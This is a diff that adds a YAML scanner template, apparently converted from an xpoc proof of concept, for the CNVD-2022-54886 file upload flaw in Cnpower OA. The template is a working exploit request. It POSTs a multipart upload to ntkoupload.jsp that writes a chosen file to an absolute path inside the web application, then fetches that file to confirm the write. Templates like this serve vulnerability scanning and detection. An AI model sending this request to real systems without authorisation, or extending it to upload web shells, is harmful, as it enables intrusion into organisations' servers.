@@ -1,0 +1,33 @@
+id: yaml-poc-cnpower-cnpower_oa-file_upload-CNVD-2022-54886
+info:
+  name: Yaml Poc Cnpower Cnpower_Oa File_Upload Cnvd 2022 54886
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-cnpower-cnpower_oa-file_upload-CNVD-2022-54886'
+  tags: fileupload
+  reference:
+  - https://github.com/Phuong39/2022-HW-POC
+http:
+- method: POST
+  path:
+  - /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp
+  body: "------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data;\
+    \ name=\"EDITFILE\"; filename=\"{{s1}}.txt\"\r\nContent-Type: image/png\r\n\r\n\
+    {{s2}}\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data;\
+    \ name=\"newFileName\"\r\n\r\nD:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/{{s1}}.txt\r\
+    \n------WebKitFormBoundaryzRSYXfFlXqk6btQm-- "
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /OAapp/htpages/app/module/login/{{s1}}.txt
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
